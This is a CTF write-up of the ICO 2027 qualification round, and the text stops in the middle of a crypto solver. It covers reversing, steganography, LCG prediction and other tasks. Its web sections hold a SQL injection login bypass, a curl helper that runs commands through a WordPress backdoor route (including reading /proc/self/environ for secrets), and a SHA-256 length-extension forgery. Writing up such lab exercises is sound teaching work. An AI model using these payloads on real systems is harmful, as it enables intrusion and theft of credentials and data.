# ICO 2027 Qualifications CTF Writeups

<p align="center">
  <a href="#english">English</a> | <a href="#russian">Русский</a>
</p>

Writing this exactly how I actually solved it: what I noticed first, what tipped me off, what tools I reached for, and why each trick actually worked. Not the cleaned-up "obviously you just do X" version - the real process, messy bits included.

---

<a id="english"></a>

# English

## 0. Context and Glossary

`CTF` stands for `Capture The Flag`. In cybersecurity, a flag is a secret string hidden inside a task - find it, submit it, get points.

The usual flag format here was:

```text
ICO{something_here}
ico{something_here}
```

`Jeopardy-style CTF` means there's a big board of separate tasks across different categories (like the Jeopardy game show board), and you pick whichever one you want to attack. Each task gives points and one or more flags.

| Category | Explanation |
|---|---|
| Web security | Websites, login forms, APIs, cookies, WordPress, authorization bugs. |
| Cryptography | Weak hashes, signatures, random generators, or encryption logic. |
| Rev or Reverse engineering | Figuring out what a program does without having its original source code. |
| Digital forensics | Files, images, audio, metadata, PCAPs, hidden data. |
| Pwn or Binary exploitation | Breaking compiled programs, usually via memory bugs. |

Terms I leaned on a lot:

| Term | Meaning |
|---|---|
| API | Application Programming Interface. How programs talk to other programs. |
| JSON | JavaScript Object Notation. A structured text format, like `{"ok":true}`. |
| SQL | Structured Query Language. The language databases understand. |
| SQLi | SQL injection. A bug where my input changes the actual database query. |
| RCE | Remote Code Execution. A bug that lets me run commands on someone else's server. |
| PRNG | Pseudo-Random Number Generator. Looks random, but it's really just following a formula. |
| LCG | Linear Congruential Generator. A dead-simple PRNG formula: `x[n+1] = (a*x[n] + c) mod m`. |
| EXIF | Metadata baked into image files - GPS coordinates, camera model, timestamps, comments. |
| PCAP | A packet capture file - saved network traffic. |
| ROP | Return-Oriented Programming. A pwn technique that chains together tiny snippets of code already sitting inside the binary. |
| MAC | Message Authentication Code. A signature/tag that proves a message wasn't tampered with. |
| SHA-256 | A hash algorithm. Feed it anything, it spits out 256 bits (64 hex characters), and that output is a one-way fingerprint of the input. |
| HMAC | A hashing construction built specifically to be safe against length-extension attacks (unlike plain `sha256(secret + message)`). |
| ELF | Executable and Linkable Format - the standard file format for compiled Linux programs. If a challenge hands you a `.bin` file on Linux, this is almost always what it actually is. |
| `objdump` | A tool that disassembles a binary back into (mostly) readable assembly instructions, so you can see what it actually does at the CPU level. |
| `chmod +x` | The Linux command that flags a file as "allowed to run." Downloaded challenge binaries usually don't have this set by default - you have to add it yourself. |

Tools I used:

| Tool | Why I used it |
|---|---|
| `file` | Checks a file's *real* type/extension using its magic bytes, not its extension. |
| `strings` | Pulls out readable text sitting inside a file or binary. |
| `xxd` / `od` | Dumps raw bytes as hex so I can eyeball headers and structure. |
| `base64` | Encodes/decodes Base64 text. |
| `curl` | Sends exact, scriptable HTTP requests. |
| Browser DevTools | Inspects HTML, JavaScript, cookies, and network requests. |
| `nc` | Netcat - connects to raw TCP services. |
| Python | Automation, math, decoding, writing exploits. |
| pwntools | Python library built specifically for pwn challenges. |
| `tshark` / Wireshark | Reads and filters PCAP network traffic. |
| `zsteg` | Hunts for hidden data stuffed into an image's bit planes. |
| Ghidra / `objdump` | Reverse-engineering compiled binaries. |

## Final Results

| # | Task | Category | Result |
|---:|---|---|---|
| 1 | Rev Zero | Reverse | `ico{R3v3R$3_fR0m_Z3r0}` |
| 2 | Wolf Protocol | Reverse | `ico{w0lves_see_th3_h1dd3n_truth_42}` |
| 3 | Can you hear the flag? | Forensics | `ico{a7f3c91e2b6d48f5c0a19d83e72b4f61}` |
| 4 | Five Shards | Forensics | `ico{5h4rd5_4r3_b3tt3r_t0g3th3r!}` |
| 5 | NorthStar | Web | `ico{721427dd34030ef0c0458d1e5067395e}` |
| 6 | Backdoor | Web / WordPress | `ico{7519ee9f05a6a11ca96cc044c971b6ae}` |
| 7 | PixelMart | Crypto / PRNG | `ICO{f1gur3_1t_0ut_y0urs3lf_th3n_3xpl0it}` |
| 8 | VIP Club | Crypto | never wrote it down, see below |
| 9 | Journal Operator | Pwn | `ICO{str1pp3d_but_st1ll_wr1t3abl3}` |
| 10 | AEZAKMI | Pwn | `ICO{n0_symb0ls_st1ll_p0pp3d_rd1}` |

During Backdoor I also stumbled onto an extra environment flag:

```text
ico{258da6df9fcf12cf110d42dd77d7937f}
```

---

## 1. Rev Zero

### Challenge

![Task Description](/ico_qualifying_round/tasks/rev_zero.webp)

```text
The terminal is locked. The code is right in front of you.
```

**Challenge file:** `rev_zero.html`, in the [shared Drive folder](https://drive.google.com/drive/folders/1pKuyT6qqqxKOCK9oq7Dl5VGQzTkIW_ZW) with every other challenge's files.

This was a reverse-engineering task, and the twist is almost funny once you see it: the entire check is sitting in plain JavaScript. If your browser can download the code, so can you - "hidden" logic that ships straight to the client isn't actually hidden.

### What I found

Opened the page, checked the source, found this sitting right there:

```javascript
if (btoa(input.split('').reverse().join('')) === 'fTByM1pfbTBSZl8zJFIzdjNSe29jaQ==') {
    // correct
}
```

Line by line:

| Code | Meaning |
|---|---|
| `input.split('')` | Splits my input into an array of single characters. |
| `.reverse()` | Reverses the order of that array. |
| `.join('')` | Glues the array back into one string. |
| `btoa(...)` | Base64-encodes the string (`btoa` = "binary to ASCII", it's a browser built-in). |
| `===` | Strict equality check against the hardcoded string. |

So the app's logic, start to finish, is:

```text
input -> reverse -> Base64 -> compare
```

To solve it I just run that pipeline backwards:

```text
hardcoded Base64 -> decode -> reverse
```

### Manual solve

```bash
echo 'fTByM1pfbTBSZl8zJFIzdjNSe29jaQ==' | base64 -d
```

Output:

```text
}0r3Z_m0Rf_3$R3v3R{oci
```

That's obviously the flag written backwards - the `}` at the start and `{oci` at the end give it away immediately. Reverse it:

```text
ico{R3v3R$3_fR0m_Z3r0}
```

### Python solver

```python
import base64

encoded = "fTByM1pfbTBSZl8zJFIzdjNSe29jaQ=="
decoded = base64.b64decode(encoded).decode()
flag = decoded[::-1]
print(flag)
```

Explanation:

| Line | Explanation |
|---|---|
| `import base64` | Loads Python's Base64 helper module. |
| `encoded = ...` | Stores the hardcoded value straight from the JS. |
| `base64.b64decode(encoded)` | Decodes Base64 back down to raw bytes. |
| `.decode()` | Turns those bytes into an actual text string. |
| `[::-1]` | Python slice trick that reverses a string (step of `-1` walks it backwards). |
| `print(flag)` | Prints the flag. |

### Flag

```text
ico{R3v3R$3_fR0m_Z3r0}
```

---

## 2. Wolf Protocol

### Challenge

![Task Description](/ico_qualifying_round/tasks/wolf_protocol.webp)

```text
The binary speaks only one language. Are you fluent?
```

**Challenge file:** `wolf_protocol.bin`, in the [shared Drive folder](https://drive.google.com/drive/folders/1pKuyT6qqqxKOCK9oq7Dl5VGQzTkIW_ZW) - remember to `chmod +x` it after downloading if you actually want to run it, downloaded binaries don't get execute permission by default.

This was a reverse-engineering binary task - a `binary` is just a compiled program, so instead of reading clean source code, I had to reconstruct the algorithm by reading what the program actually *does*.

### Main idea

The binary ran every byte of the flag through three reversible steps:

1. S-box substitution.
2. XOR with a generated key byte.
3. Rotate the bits left.

An `S-box` is just a substitution table - swap byte X for byte Y according to a fixed lookup. `XOR` is reversible because `x ^ k ^ k = x` (XOR-ing with the same key twice cancels itself out). And any rotate-left can be undone with the matching rotate-right. All three steps are one-way-feeling but are actually completely invertible if you know the key material - which is the whole point of reversing this.

### Constants I recovered

```python
MULTIPLIER = 6364136223846793005
INCREMENT = 1442695040888963407
MASK64 = (1 << 64) - 1

SBOX_SEED = 0xDEADBEEF13370042
KEY_SEED = 0xBEEFCAFE0BADF00D

TARGET = bytes([
    32, 79, 206, 17, 115, 221, 115, 78, 80, 114, 43, 141,
    201, 26, 244, 130, 98, 168, 126, 73, 184, 202, 206,
    66, 111, 100, 174, 217, 170, 90, 69, 160, 184, 66, 192,
])
```

Small detail worth pointing out: `MULTIPLIER` and `INCREMENT` aren't random-looking numbers someone typed in for fun - they're the exact 64-bit multiplier/increment pair from the well-known Knuth MMIX linear congruential generator (the same constants show up in PCG-family PRNGs too). `SBOX_SEED`, `KEY_SEED`, and the `0x1337c0de`-style constant that shows up later in AEZAKMI are all classic hacker-culture "leet speak" magic numbers (`DEADBEEF`, `BEEFCAFE`, `BADF00D`) - a fun little signature the challenge author left in, not something functionally special.

The checker was equivalent to:

```text
cipher_byte = rol8(sbox[plain_byte] ^ key_byte, rotation)
```

So to undo it, I just run every step backwards, in reverse order:

```text
plain_byte = inverse_sbox[ror8(cipher_byte, rotation) ^ key_byte]
```

### Solver

```python
MULTIPLIER = 6364136223846793005
INCREMENT = 1442695040888963407
MASK64 = (1 << 64) - 1

SBOX_SEED = 0xDEADBEEF13370042
KEY_SEED = 0xBEEFCAFE0BADF00D

TARGET = bytes([
    32, 79, 206, 17, 115, 221, 115, 78, 80, 114, 43, 141,
    201, 26, 244, 130, 98, 168, 126, 73, 184, 202, 206,
    66, 111, 100, 174, 217, 170, 90, 69, 160, 184, 66, 192,
])


def lcg_next(state):
    return (state * MULTIPLIER + INCREMENT) & MASK64


def ror8(value, amount):
    amount &= 7
    return ((value >> amount) | (value << (8 - amount))) & 0xff


def build_sbox():
    sbox = list(range(256))
    state = SBOX_SEED
    for i in range(255, 0, -1):
        state = lcg_next(state)
        j = state % (i + 1)
        sbox[i], sbox[j] = sbox[j], sbox[i]
    return sbox


def build_key(length):
    state = KEY_SEED
    key = []
    for _ in range(length):
        state = lcg_next(state)
        key.append((state >> 24) & 0xff)
    return key


sbox = build_sbox()
inverse_sbox = [0] * 256

for original, substituted in enumerate(sbox):
    inverse_sbox[substituted] = original

key = build_key(len(TARGET))
flag = []

for i, target_byte in enumerate(TARGET):
    rotation = (i % 7) + 1
    byte = ror8(target_byte, rotation) ^ key[i]
    flag.append(inverse_sbox[byte])

print(bytes(flag).decode())
```

Important lines, explained:

| Line | Meaning |
|---|---|
| `lcg_next` | Recreates the exact same pseudo-random generator the binary uses internally, step for step. |
| `& MASK64` | Chops the result back down to 64 bits, mimicking the CPU's natural integer overflow. |
| `build_sbox()` | Rebuilds the same shuffled substitution table. It's a Fisher-Yates-style shuffle: start with `[0, 1, 2, ..., 255]` in order, then walk backwards from index 255 down to 1, and at each step swap the current element with a random earlier-or-equal one (`j = state % (i + 1)` guarantees `j` always lands inside the still-unshuffled portion). Do that enough times and you get a fully shuffled table - but since it's driven by the same seeded LCG, it's the *exact same* shuffle every time, not a real random one. |
| `build_key()` | Rebuilds the same key stream, byte by byte, from the same seed. |
| `inverse_sbox` | The substitution table flipped around, so I can undo a substitution instead of applying one. If `sbox[5] = 200`, then `inverse_sbox[200] = 5`. |
| `ror8(...) ^ key[i]` | Undoes the rotate-left (with rotate-right) and the XOR (by XOR-ing again with the same key byte), in the correct reverse order. |

### Flag

```text
ico{w0lves_see_th3_h1dd3n_truth_42}
```

---

## 3. Can you hear the flag?

### Challenge

![Task Description](/ico_qualifying_round/tasks/can_you_hear_the_flag.webp)

```text
Just a picture. Nothing to see here.
```

**Challenge file:** `challenge.png`, in the [shared Drive folder](https://drive.google.com/drive/folders/1pKuyT6qqqxKOCK9oq7Dl5VGQzTkIW_ZW).

The title says "hear," the description says "picture." That mismatch *is* the hint - it's basically the challenge author winking at you. So I stopped treating the image as just an image, and started treating it as a container that might be hiding something else entirely.

This is forensics/steganography territory. `Steganography` means hiding data inside another, completely unrelated-looking file.

### Steps

First, confirm what the file actually is, not what its extension claims:

```bash
file challenge.png
```

Then scan for any readable hints sitting inside it:

```bash
strings -a challenge.png | grep -iE 'ico|flag|ctf|wav|sound|audio|hint'
```

Then check for anything embedded inside the file:

```bash
binwalk challenge.png
binwalk -e challenge.png
```

`binwalk` scans for known file signatures *inside* another file - basically "does this file secretly contain a second file glued onto the end (or hidden inside) of it." If a WAV/audio file was appended after the image data, this is exactly how you'd catch it.

Once the hidden audio was extracted, I turned it into a spectrogram to actually look at the sound:

```bash
ffmpeg -i hidden.wav -lavfi showspectrumpic=s=1600x900 spectrogram.png
```

Alternative, if you'd rather use `sox`:

```bash
sox hidden.wav -n spectrogram -o spectrogram.png
```

A `spectrogram` is genuinely just a picture of sound:

| Direction | Meaning |
|---|---|
| left to right | time |
| bottom to top | frequency |
| brightness/color | volume/intensity |

People sometimes hide text or images inside audio precisely because it shows up clearly once you look at the spectrogram instead of just listening - and sure enough, the flag was sitting right there, drawn straight into the frequency data.

### Flag

```text
ico{a7f3c91e2b6d48f5c0a19d83e72b4f61}
```

---

## 4. Five Shards

### Challenge

![Task Description](/ico_qualifying_round/tasks/five_shards.webp)

```text
The flag was shattered across five files. Each shard is a piece of a larger puzzle - but not every file is what it seems, and not every secret is obvious.
Find them all. Put them together.
```

**Challenge files:** all five files below are in the [shared Drive folder](https://drive.google.com/drive/folders/1pKuyT6qqqxKOCK9oq7Dl5VGQzTkIW_ZW), same names as below.

The folder contained:

```text
corrupted.wav
noise.png
photo.jpg
readme.txt
traffic.pcap
```

"Five shards" in the title, five files in the folder - so step one was just: inspect every single one, assume nothing is what its extension claims.

### Step 1 - identify file types

```bash
file corrupted.wav noise.png photo.jpg readme.txt traffic.pcap
```

Important result:

```text
corrupted.wav: compiled Java class data
noise.png: PNG image data, 800 x 400, 8-bit/color RGB
photo.jpg: JPEG image data, Exif metadata
readme.txt: ASCII text
traffic.pcap: pcap capture file
```

`corrupted.wav` immediately stood out as sketchy - a real WAV file always starts with the bytes `RIFF`, not with whatever makes `file` think it's a Java class.

### Step 2 - README

The README had a big Base64 blob sitting in it:

```bash
echo 'Tm90aGluZyB0byBzZWUgaGVyZS4gVGhpcyBpcyBhIHJlZCBoZXJyaW5nLgpUaGUgZmxhZyBpcyBub3QgaW4gdGhpcyBmaWxlLgpIaW50OiBmaXZlIGZpbGVzLCBmaXZlIHNoYXJkcywgb25lIHRydXRoLg==' | base64 -d
```

Output:

```text
Nothing to see here. This is a red herring.
The flag is not in this file.
Hint: five files, five shards, one truth.
```

A `red herring` is just a deliberate distraction - but even a red herring can confirm you're on the right track, and this one confirmed the "5 files, 5 pieces" structure.

### Step 3 - fix the WAV

Checked the raw header bytes directly:

```bash
xxd -l 32 corrupted.wav
```

(`-l 32` just means "only show me the first 32 bytes," no need to dump the whole file.)

The first bytes were:

```text
ca fe ba be de ad c0 de 52 49 46 46 34 b1 02 00
57 41 56 45 66 6d 74 20
```

Meaning, byte group by byte group:

| Bytes | Meaning |
|---|---|
| `ca fe ba be` | Java class file magic bytes (`CAFEBABE` - yes, that's a real, official Java magic number). This is what tricked `file` into calling it Java class data. |
| `de ad c0 de` | Another classic hex-speak junk marker (`DEADCODE`), just padding to confuse the file-type detector further. |
| `52 49 46 46` | ASCII for `RIFF` - the real start of a WAV file, buried 8 bytes in. |
| `57 41 56 45` | ASCII for `WAVE`, confirming it. |

So the fix was just chopping off those first 8 fake bytes:

```bash
tail -c +9 corrupted.wav > fixed.wav
file fixed.wav
```

`tail -c +9` means "start output from byte number 9 onward." Bytes 1 through 8 were the fake `CAFEBABE DEADCODE` header; byte 9 is exactly where the real `RIFF` starts.

### Step 4 - photo metadata

```bash
exiftool photo.jpg
```

Important clues buried in the EXIF fields:

```text
The 13th step reveals the truth
Somewhere high in the Caucasus
GPS: 43°20'59.640"N, 42°26'43.080"E
Altitude: 5642m
```

That GPS coordinate plus a 5642m altitude points straight at Mount Elbrus. And "the 13th step" is a pretty direct nod to `ROT13`.

`ROT13` shifts every letter 13 positions through the alphabet. The cute property: applying it twice in a row gives you back the original text, since the alphabet only has 26 letters (13 + 13 = 26 = a full loop).

```python
import codecs
print(codecs.decode("vpb", "rot_13"))
```

Output:

```text
ico
```

### Step 5 - PCAP DNS shard

```bash
tshark -r traffic.pcap -Y dns -T fields -e dns.qry.name | sort -u
```

(`-r` reads a capture file, `-Y dns` filters down to just DNS traffic, `-T fields -e dns.qry.name` prints only the queried domain name from each packet.)

The DNS queries contained ordered, numbered chunks:

```text
000-UOO5LRPL.shard4.ctf
001-YX2KZLWL.shard4.ctf
002-4WFKZHU7.shard4.ctf
003-XT4YVTUN.shard4.ctf
004-VTZLJ3VN.shard4.ctf
005-ZXHNN3O7.shard4.ctf
006-4GRQ====.shard4.ctf
```

This is a classic DNS-exfiltration pattern - smuggling data out (or in this case, hiding a puzzle piece) as a sequence of fake subdomain lookups. I stripped the index numbers and the `.shard4.ctf` domain suffix, then joined the leftover labels in order:

```text
UOO5LRPLYX2KZLWL4WFKZHU7XT4YVTUNVTZLJ3VNZXHNN3O74GRQ====
```

That string, padding and all, is Base32:

```python
import base64

s = "UOO5LRPLYX2KZLWL4WFKZHU7XT4YVTUNVTZLJ3VNZXHNN3O74GRQ===="
raw = base64.b32decode(s)
print(raw.hex())
```

Output:

```text
a39dd5c5ebc5f4acaecbe58aac9e9fbcf98ace8dacf2b4eeadcdced6eddfe1a3
```

### Step 6 - noise.png

Ran `zsteg`, which specifically hunts through an image's individual bit planes for hidden data:

```bash
zsteg -a noise.png
```

The real lead in a wall of output was this one line:

```text
b4,g,lsb,xy .. file: zlib compressed data
```

Breaking that down:

| Part | Meaning |
|---|---|
| `b4` | bit plane 4 (the 5th-from-lowest bit of each byte) |
| `g` | the green color channel |
| `lsb` | least-significant-bit ordering |
| `xy` | pixels read left-to-right, then top-to-bottom |
| `zlib` | and what's hidden there is zlib-compressed data |

So I extracted that specific bit plane and decompressed whatever was sitting in it:

```bash
zsteg -E b4,g,lsb,xy noise.png > noise_shard.zlib
python3 - <<'PY'
import zlib
raw = open("noise_shard.zlib", "rb").read()
print(zlib.decompress(raw))
PY
```

After pulling all five shards apart and stitching them together with the hints from each step, the assembled flag was:

```text
ico{5h4rd5_4r3_b3tt3r_t0g3th3r!}
```

---

## 5. NorthStar

### Challenge

![Task Description](/ico_qualifying_round/tasks/northstar.webp)

```text
For years, Northstar Systems guided critical deployments across the globe. After a sudden breach locked the operations center, the company's internal portal was taken offline. Rumors suggest the attackers left two flags behind: one buried in the authentication system, and another hidden within the deployment infrastructure.
https://task1.cyberolympiad.kz
```

This one was a live web challenge - no files to download, just a URL. The phrase "authentication system" pointed me straight at the login form first.

### SQL injection

The payload that actually worked:

```text
username=' OR 1=1-- -
password=x
```

A vulnerable login query behind the scenes probably looks something like:

```sql
SELECT * FROM users
WHERE username = '$username'
AND password = '$password';
```

Drop my input straight in there, unescaped, and it turns into:

```sql
SELECT * FROM users
WHERE username = '' OR 1=1-- -'
AND password = 'x';
```

Symbol by symbol:

| Part | Meaning |
|---|---|
| `'` | closes the quote the original query opened for `$username` |
| `OR 1=1` | an always-true condition, so the `WHERE` clause matches every row regardless of the real username/password |
| `-- -` | SQL's line-comment marker - everything after it (including the password check) gets thrown away and never evaluated |

### Reproduce with curl

```bash
BASE='https://task1.cyberolympiad.kz'

curl -sk -i -X POST "$BASE/login" \
  --data-urlencode "username=' OR 1=1-- -" \
  --data-urlencode "password=x"
```

Flag meanings, since these come up constantly for the rest of this writeup too:

| Flag | Meaning |
|---|---|
| `-s` | silent - don't print the progress bar |
| `-k` | skip TLS certificate verification (fine here, CTF servers often run self-signed certs) |
| `-i` | include the response headers in the output, not just the body |
| `-X POST` | explicitly send this as an HTTP POST request |
| `--data-urlencode "field=value"` | sends `field=value` as form data, URL-encoding it safely so special characters like the `'` above don't break the request itself |

Bypassing the login this way landed me straight on the dashboard, flag included.

### Flag

```text
ico{721427dd34030ef0c0458d1e5067395e}
```

---

## 6. Backdoor

### Challenge

![Task Description](/ico_qualifying_round/tasks/backdoor.webp)

```text
Once a thriving community blog, this WordPress site was abandoned after its administrator vanished without a trace. The site remains online, filled with forgotten posts and an oddly persistent plugin installed by the last person to access the dashboard.
Explore the site, uncover its weaknesses, and find the flags hidden behind the administrator's account and on the system.
https://task2.cyberolympiad.kz
```

Another live web challenge, this time WordPress. `WordPress` is a CMS (Content Management System) - a huge chunk of the internet's blogs run on it. A `plugin` is just extra PHP code bolted onto a WordPress install. That phrase "oddly persistent plugin" was the actual hint: go looking for custom REST API routes and `mu-plugins` ("must-use plugins" - plugins WordPress force-loads on every request, no way to disable them from the admin panel, which makes them a great place to hide a backdoor).

### REST API enumeration

```bash
BASE='https://task2.cyberolympiad.kz'

curl -sk "$BASE/wp-json/" | python3 -m json.tool
curl -sk "$BASE/wp-json/wp/v2/users" | python3 -m json.tool
```

(`python3 -m json.tool` just pretty-prints whatever JSON comes back, instead of dumping it as one unreadable line.)

The `/wp-json/` root lists every registered API namespace on the site - including ones plugins add themselves - and `/wp-json/wp/v2/users` is WordPress's default (often publicly-exposed) user listing endpoint.

Found a user:

```text
sp3c1al
```

And, sitting in that namespace list, a custom route that had no business being there:

```text
/wp-json/wp2shell/v1/f8b000a326e88105cb84a05c
```

The name `wp2shell` is about as subtle as a brick - that's a command-execution backdoor if I've ever seen one.

### Backdoor protocol

The route expected a JSON body with a Base64-encoded command in a field called `c`:

```json
{"c":"BASE64_COMMAND_HERE"}
```

So I wrapped that into a little shell helper:

```bash
BASE='https://task2.cyberolympiad.kz'
ROUTE='/wp-json/wp2shell/v1/f8b000a326e88105cb84a05c'

run_cmd() {
  cmd="$1"
  b64="$(printf '%s' "$cmd" | base64 -w0)"
  curl -sk -X POST "$BASE$ROUTE" \
    -H 'Content-Type: application/json' \
    -d "{\"c\":\"$b64\"}"
}
```

Line by line:

| Line | Explanation |
|---|---|
| `cmd="$1"` | grabs whatever command I pass into the function |
| `printf '%s' "$cmd"` | prints it exactly as-is, no trailing newline to mess up the encoding |
| `base64 -w0` | Base64-encodes it as a single unwrapped line (`-w0` disables the default line-wrapping) |
| `curl -X POST` | sends it as a POST request |
| `-H 'Content-Type: application/json'` | tells the server "this body is JSON," so it actually parses it correctly |
| `-d ...` | the actual JSON body being sent |

Confirmed RCE (remote code execution) with the simplest possible check:

```bash
run_cmd 'id'
```

Then went straight for the flag:

```bash
run_cmd 'cat /flag.txt'
```

Flag:

```text
ico{7519ee9f05a6a11ca96cc044c971b6ae}
```

### Extra environment flag

While I was in there, I poked around the WordPress files a bit more:

```bash
run_cmd 'find /var/www/html -maxdepth 4 -type f -name "*.php" 2>/dev/null | grep -Ei "mu-plugins|flag|shell|plugin"'
```

Turned up an interesting file:

```text
wp-content/mu-plugins/flag-plugin.php
```

So I checked the environment variables of the running process:

```bash
run_cmd "tr '\0' '\n' < /proc/self/environ | grep -E 'FLAG|USER_FLAG|ico'"
```

`/proc/self/environ` is a special Linux file that holds every environment variable for the current process - but the entries are separated by null bytes (`\0`), not newlines, so they'd all print as one unreadable blob without `tr '\0' '\n'` translating those null separators into actual line breaks first.

Extra flag:

```text
ico{258da6df9fcf12cf110d42dd77d7937f}
```

---

## 7. PixelMart

### Challenge

![Task Description](/ico_qualifying_round/tasks/pixelmart.webp)

```text
The online store "PixelMart" gives out bonus codes using its own random generator and prides itself on its integrity.
Join us and see if it's really that hard to predict.
nc 94.131.84.228 33007
```

A PRNG-prediction challenge: connect, the service hands over a handful of outputs from its "random" generator, and the goal is to predict what it spits out next - proving the "random" generator is anything but.

### Given values

```text
m = 4294967296
hidden_bits = 16
x0 = 3398650787
x1 = 3458068990
x2_top = 54800
x3 = 27663828
rounds = 20
```

`m = 4294967296 = 2^32` - that's a dead giveaway this is a 32-bit LCG (Linear Congruential Generator).

The LCG formula, as already covered in the glossary:

```text
x[n+1] = (a * x[n] + c) mod m
```

I had `x0`, `x1`, and `x3` in full, but only the *top* 16 bits of `x2` - the bottom 16 bits were hidden. That's only `65536` possible values to guess, which is nothing for a computer, so brute-forcing that gap is completely reasonable.

### The math (why this is even solvable)

An LCG normally looks unpredictable *if you don't know `a` and `c`*. But here's the trick: with three consecutive outputs, you can solve for both.

Since `x[n+1] = a*x[n] + c (mod m)` holds for every step, write it out for two consecutive pairs and subtract them - the `c` cancels out completely:

```text
x2 - x1 ≡ a * (x1 - x0)   (mod m)
```

Which rearranges to:

```text
a ≡ (x2 - x1) * inverse(x1 - x0)   (mod m)
```

`inverse(...)` here means the *modular* inverse - the number that, multiplied by `(x1 - x0)` and reduced mod `m`, gives exactly `1`. It's the modular-arithmetic equivalent of dividing. Once `a` is known, `c` falls straight out of the original formula: `c = x1 - a*x0 (mod m)`.

The only snag: I don't know the real `x2` yet, just its top 16 bits. So the plan is to brute-force all `65536` possibilities for the missing lower bits, and for each guess, solve for `a` and `c`, then check whether they correctly predict the *known* `x3`. Only the correct guess will make that final check pass.

### Solver

```python
m = 2**32
hidden_bits = 16

x0 = 3398650787
x1 = 3458068990
x2_top = 54800
x3 = 27663828


def next_value(x, a, c):
    return (a * x + c) % m


for lower in range(1 << hidden_bits):
    x2 = (x2_top << hidden_bits) | lower

    try:
        a = ((x2 - x1) * pow(x1 - x0, -1, m)) % m
    except ValueError:
        continue

    c = (x1 - a * x0) % m

    if next_value(x2, a, c) == x3:
        print("lower =", lower)
        print("x2 =", x2)
        print("a =", a)
        print("c =", c)
        break
```

Worth calling out a couple of specific lines:

| Line | Meaning |
|---|---|
| `x2 = (x2_top << hidden_bits) \| lower` | Rebuilds a full candidate `x2` by shifting the known top bits left and OR-ing in the current guess for the missing bottom 16 bits. |
| `pow(x1 - x0, -1, m)` | Python's built-in three-argument `pow()` computes a *modular inverse* when the exponent is `-1` (this shortcut was added in Python 3.8, and uses the extended Euclidean algorithm under the hood). |
| `except ValueError: continue` | The modular inverse doesn't exist for every number - only for values that share no common factor with `m` (i.e. `gcd(x1-x0, m) == 1`). When it doesn't exist, Python raises `ValueError`, and I just skip that guess and try the next one. |

Output:

```text
lower = 32441
x2 = 3591405241
a = 274874657
c = 646369019
```

Then, with `a` and `c` fully recovered, predicting the next 20 outputs is just running the formula forward:

```python
m = 2**32
a = 274874657
c = 646369019
x = 27663828

for _ in range(20):
    x = (a * x + c) % m
    print(x)
```

Predictions:

```text
900430671
3224290090
573546853
3209642496
864047355
246872662
3063474705
774720556
2207042727
2744227714
1401379005
282803288
2529947219
3390675630
3400920425
3950252676
1337505279
4012508122
3210717205
3281178288
```

Sent those 20 predictions back to the service, and it handed over the flag.

### Flag

```text
ICO{f1gur3_1t_0ut_y0urs3lf_th3n_3xpl0it}
```

---

## 8. VIP Club

### Challenge

![Task Description](/ico_qualifying_round/tasks/vip_club.webp)

```text
A private club issues guest passes based on a secret known only to them. You've been given a standard guest pass - enter as an admin.
nc 94.131.84.228 33006
```

The server handed over:

```text
data0 = 757365723d6775657374266c6576656c3d6261736963
token0 = e5e16bd00e210a057d9a0fc98d92b8b52ffad64c92b4ca3cd6fc15648011594a
```

Decoded the hex data first, just to see what I was actually working with:

```python
data0 = bytes.fromhex("757365723d6775657374266c6576656c3d6261736963")
print(data0)
```

Output:

```text
b'user=guest&level=basic'
```

So the whole goal, in plain terms: turn `level=basic` into an admin pass, without ever knowing the server's secret key.

### Vulnerability: SHA-256 length extension

The (weak, broken) way this pass system was signing things:

```text
token = sha256(secret || message)
```

(`||` here just means "bytes glued together, one after the other.")

Here's the problem with that specific pattern: SHA-256 (like most classic hash functions) is built on something called a Merkle–Damgård construction - it processes input in fixed-size blocks, and its "hash so far" *is* its entire internal state at that point. Which means: if I know a valid hash of `secret || message`, and I know (or can guess) exactly how long `secret || message` was, I can resume hashing from that exact state and keep feeding it more data - computing a perfectly valid hash for `secret || message || padding || extra_data`, without ever learning a single byte of `secret`.

That's called a **length-extension attack**, and it's specifically a `secret || message` construction that's vulnerable to it. The fix is `HMAC-SHA256(secret, message)`, which is built differently (nesting the hash calls) specifically to *not* leak its internal state this way.

### Forged data

Original message:

```text
user=guest&level=basic
```

Data I wanted to sneak onto the end:

```text
&level=admin
```

The forged data that ended up getting accepted:

```text
757365723d6775657374266c6576656c3d6261736963800000000000000000000000000000000000000000000140266c6576656c3d61646d696e
```

And the forged token that went with it:

```text
a97ae0b7c03ac5a0ec752a0c710e8a71354f2386306b5824210a06cd1903ce20
```

Notice that big block of zeros in the middle, ending in `0140` - that's not random junk, that's **glue padding**, and it's exactly what SHA-256 itself would have appended before hashing. It always looks the same shape: a single `0x80` byte, then zero bytes to pad out to a block boundary, then the original message's *bit-length* as a fixed 8-byte number at the very end. That `0140` at the tail is `0x140 = 320` in decimal, which is a *bit* count - `320 / 8 = 40` bytes. So the original hashed data (`secret || message`) was 40 bytes total. The message itself was 22 bytes (count `user=guest&level=basic` - yep, 22 characters), so the secret had to be exactly `40 - 22 = 18` bytes long.

### The solver script

This is exactly what [`tasks/sha256_ext.py`](/ico_qualifying_round/tasks/sha256_ext.py) is for - I wrote SHA-256 completely from scratch specifically so I could reach in and grab its internal 32-byte state mid-hash, which Python's built-in `hashlib` deliberately won't let you do.

What's actually in that file, piece by piece:

| Part | What it does |
|---|---|
| `_K` | The 64 round constants the SHA-256 spec defines. Not arbitrary either, fun fact - they're the fractional parts of the cube roots of the first 64 prime numbers, baked in as fixed 32-bit values. |
| `_rotr(x, n)` | Rotates a 32-bit value right by `n` bits - one of the bit-mixing building blocks SHA-256's compression function runs on every round. |
| `_compress(state, block)` | The actual SHA-256 compression function: takes the current 8-word state plus one 64-byte block of message, runs the full 64-round mixing schedule from the spec, and returns the new state. This is the core of the hash. |
| `sha256_padding(total_len_bytes)` | Builds that exact glue padding described above: one `0x80` byte, then zero bytes out to the block boundary, then the total bit-length as a big-endian 8-byte integer. |
| `state_from_hexdigest(hexdigest)` | Takes a hex string like `token0` and turns it back into SHA-256's real internal representation: 8 numbers, 32 bits each. |
| `hexdigest_from_state(state)` | The reverse - turns that internal state back into the familiar hex string. |
| `extend(known_hexdigest, known_total_len, suffix)` | The actual attack. Loads the given hash as a starting state, works out what padding the original hashing would have added, then keeps compressing forward with `suffix` (plus its own trailing padding) as if it were just continuing the original hash. Returns the new valid hash, plus the glue padding needed so the forged message lines up correctly. |

Here's the driver I ran on top of it - and I actually re-verified this against the real numbers above while writing this up, it reproduces the exact forged data and token shown:

```python
import sha256_ext as s

data0 = bytes.fromhex("757365723d6775657374266c6576656c3d6261736963")
